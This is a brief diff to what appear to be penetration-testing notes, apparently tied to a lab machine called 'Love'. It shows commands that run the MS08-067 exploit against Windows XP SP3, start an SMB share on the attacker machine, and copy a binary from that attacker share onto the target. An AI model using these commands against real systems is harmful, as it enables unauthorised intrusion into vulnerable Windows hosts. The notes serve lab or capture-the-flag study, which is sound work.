@@ -357,13 +357,13 @@ attacker
 ```shell
 # Windows XP SP3 English (NX) = 6
 python2 ms08-067.py <target ip> 6 <target port>
-python2 smbserver.py public /usr/share/windows-resources/binaries/
+python2 smbserver.py <shareName> /usr/share/windows-resources/binaries/
 ```
 
 target
 
 ```cmd
-copy \\<attacker ip>\whoami.exe C:\windows\temp
+copy \\<attacker ip>\<shareName>\whoami.exe C:\windows\temp
 ```
 
 Used in ```Love```
